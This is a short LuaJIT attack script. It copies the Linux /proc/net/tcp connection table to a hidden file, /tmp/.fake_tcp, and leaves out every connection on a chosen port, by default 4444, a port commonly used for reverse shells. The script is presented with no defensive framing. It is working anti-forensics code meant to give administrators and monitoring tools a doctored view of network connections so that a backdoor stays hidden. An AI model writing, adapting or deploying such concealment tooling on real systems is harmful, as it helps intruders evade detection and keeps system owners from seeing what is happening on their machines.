#!/usr/bin/env luajit
-- hide_connections.lua - Hide ALL connections on specified port

local function get_tcp_connections()
    local f = io.open("/proc/net/tcp", "r")
    if not f then return {} end
    
    local lines = {}
    for line in f:lines() do
        table.insert(lines, line)
    end
    f:close()
    
    return lines
end

local function filter_connections(lines, port)
    local filtered = {}
    local port_hex = string.format("%04X", port)
    
    for _, line in ipairs(lines) do
        -- Filter if port appears in EITHER local or remote address
        if not (line:match(":" .. port_hex .. "%s") or line:match("%s%x+:" .. port_hex)) then
            table.insert(filtered, line)
        end
    end
    
    return filtered
end

local port = tonumber(arg[1]) or 4444

print("[*] Creating filtered /proc/net/tcp (hiding ALL port " .. port .. " connections)")

local lines = get_tcp_connections()
local filtered = filter_connections(lines, port)

local fake_path = "/tmp/.fake_tcp"
local f = io.open(fake_path, "w")
if f then
    for _, line in ipairs(filtered) do
        f:write(line .. "\n")
    end
    f:close()
    print("[+] Filtered file: " .. fake_path)
    print("[*] Hidden: " .. (#lines - #filtered) .. " connections")
else
    print("[-] Failed to create fake file")
    os.exit(1)
end
